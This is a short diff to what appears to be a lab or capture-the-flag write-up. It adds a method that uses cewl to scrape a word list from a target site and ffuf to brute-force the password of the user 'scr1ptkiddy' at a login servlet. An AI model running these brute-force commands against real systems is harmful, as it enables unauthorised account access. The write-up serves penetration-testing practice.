@@ -228,6 +228,22 @@ After setting the cookie values on the browser console the same way as before, I
 
 #### Method 3: Experimenting with cewl
 
+Generating a custom word list
+
+```bash
+$ cewl http://<target_machine_URL>:80 -w passwords.txt
+```
+
+Using the word list with _**ffuf**_ as password for the _**scr1ptkiddy**_ user?
+
+```bash
+
+
+$ ffuf -X POST -u http://<target_machine_URL>:8080/AuthenticationServlet?Login=scr1ptkiddy&password=FUZZ&DomainId=0 -w passwords.txt 
+```
+
+
+
 {% embed url="https://www.kali.org/tools/cewl/" %}
 
 _**Other CVEs to explore:**_&#x20;
